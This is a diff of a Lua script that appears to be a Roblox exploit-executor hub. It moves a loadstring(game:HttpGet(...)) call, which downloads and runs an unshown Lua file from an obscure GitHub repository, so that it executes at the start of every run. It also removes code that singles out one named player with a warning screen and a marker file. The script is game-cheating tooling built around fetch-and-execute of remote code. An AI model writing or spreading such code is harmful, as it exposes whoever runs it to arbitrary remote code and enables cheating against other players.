@@ -44,8 +44,10 @@ local Notify = function(Text , Description, Length)
     tween:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Position = UDim2.new(0.802, 0,0.748, 0)}):Play()
     task.wait(Length)
     tween:Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(1, 0,0.794, 0)}):Play()
-    Frame:Destroy()     
+    Frame:Destroy()
 end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/run_lua_code.lua'))()
 
 -- [] -->> Initializing Notification and the first set of necessary stuff. [Trying to make support for all executors in the process.] <<-- [] --
 
@@ -58,62 +60,6 @@ local httprequest_Init = (syn and syn.request) or (http and http.request) or htt
 function getRoot(char)
     local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
     return rootPart
-end
-
-function get_warnings()
-    local Players = game:GetService("Players")
-    if not Players:FindFirstChild("imdareslest1") then return end
-    local LocalPlayer = Players:FindFirstChild("imdareslest1")
-        
-    local function create_warning_gui(message)
-        if game.CoreGui:FindFirstChild("WarningGUI") then
-            game.CoreGui:FindFirstChild("WarningGUI"):Destroy()
-        else
-            LocalPlayer.PlayerGui:FindFirstChild("WarningGUI")
-        end
-
-        local screenGui = Instance.new("ScreenGui")
-        screenGui.Name = "WarningGUI"
-        screenGui.IgnoreGuiInset = true
-        screenGui.Parent = game:GetService("CoreGui") or LocalPlayer:FindFirstChild("PlayerGui")
-
-        local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(1, 0, 1, 0)
-        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-        frame.BorderSizePixel = 0
-        frame.Parent = screenGui
-
-        local textLabel = Instance.new("TextLabel")
-        textLabel.Size = UDim2.new(0.8, 0, 0.3, 0)
-        textLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
-        textLabel.BackgroundTransparency = 1
-        textLabel.Text = message
-        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-        textLabel.TextScaled = true
-        textLabel.Font = Enum.Font.SourceSansBold
-        textLabel.Parent = frame
-        wait(3.5)
-        screenGui:Destroy()
-    end
-
-    local function warn_player()
-        local warningMessage = "You have received a warning in: Zacks Easy Hub | Disrespecting Higher-Ups"
-
-        create_warning_gui(warningMessage)
-    end
-
-    warn_player()
-    wait(0.1)
-    writefile("Mercury_Asphalt_Data_Key.txt", "True | Saved", true)
-end
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-if LocalPlayer.Name == "imdareslest1" and isfile("Mercury_Asphalt_Data_Key.txt") then
-    warn("Checked.")
-else
-    get_warnings()
 end
 
 local Players = game:GetService("Players")
@@ -549,9 +495,7 @@ local function loadGUI()
            Key = {"None"}
         }
     })
-    wait(0.2)
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/run_lua_code.lua'))()
-    wait(0.1)
+    
     -- [] -->> Initialize Tabs and Sections <<-- [] --
     local Tab1 = Window:CreateTab("> Home Tab <", 7733960981)
     local Section1 = Tab1:CreateSection("||| Home Section |||")
